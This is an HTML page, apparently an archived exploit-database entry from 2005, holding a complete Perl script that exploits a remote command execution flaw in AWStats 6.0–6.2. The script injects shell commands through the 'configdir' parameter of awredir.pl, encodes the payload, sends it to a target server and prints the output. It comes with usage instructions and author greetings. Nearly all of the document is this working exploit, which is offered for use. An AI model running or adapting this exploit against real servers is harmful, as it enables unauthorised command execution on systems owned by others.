<html><head><title>AWStats configdir Remote Command Execution Exploit (perl code)</title></head><pre>#!/usr/bin/perl
#---GHC---------------------------------#
#Remote command execution exploit #
#Product:                                        #
#Advanced Web Statistics 6.0 - 6.2    #
#URL:http://awstats.sourceforge.net  #
#Greets &amp; respects to our friends:     #
#1dt.w0lf and all rst.void.ru              #
#Special greets 2 d0G4                    #
#&amp; cr0n for link on bugtraq               #
#---not-PRIVATE-already--------------#
# bug found by iDEFENSE                 #
# http://www.idefense.com/             #
# application/poi/display?                 #
# id=185&amp;type=vulnerabilities          #
# &amp;flashstatus=true                         #
#-----------------------------------------#

use IO::Socket;
$banner = &quot;
#################################################################
GHC 2005
Remote command execution exploit for:
Advanced Web Statistics 6.0 - 6.2
Usage:
&gt;perl ./GHCaws.pl www.server.net /cgi-bin/awredir.pl \&quot;uname -a\&quot;
#################################################################
&quot;;

$bug_param = 'configdir';
$id_start = 'b_exp';
$id_exit = 'e_exp';
$id_print = 0;
$http_head = &quot;\n\n&quot;;

sub Print_Report {
$str = $_[0];
if ($str =~ m/$id_exit/i) {
exit;
}
if ($str =~ m/$id_start/i) {
$str =~ s/$id_start//ig;
$id_print = 1;
}
if ($id_print == 1) {
print &quot;$str&quot;;
}
}

sub ConnectServer {
$socket = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$server&quot;, PeerPort =&gt; &quot;80&quot;)
|| die &quot;Error\n&quot;;
print $socket &quot;GET $dir&quot;.'?'.$bug_param.'='.&quot;$expl HTTP/1.1\n&quot;;
print $socket &quot;Host: $server\n&quot;;
print $socket &quot;Accept: */*\n&quot;;
print $socket &quot;Connection: close\n\n&quot;;
while ($report = &lt;$socket&gt;) {
&amp;Print_Report(&quot;$report&quot;);
}
}


print &quot;$banner&quot;;
if ($ARGV[0] &amp;&amp; $ARGV[1] &amp;&amp; $ARGV[2]) {
$server = $ARGV[0];
$dir = $ARGV[1];
$cmd = $ARGV[2]; }
else {
exit;
}

$expl = '|echo '.''.';echo '.$id_start.';'.$cmd.';echo '.$id_exit.';%00';
$expl =~ s/\W/&quot;%&quot;.sprintf(&quot;%x&quot;,ord($&amp;))/eg;
&amp;ConnectServer;

# milw0rm.com [2005-01-25]</pre></html>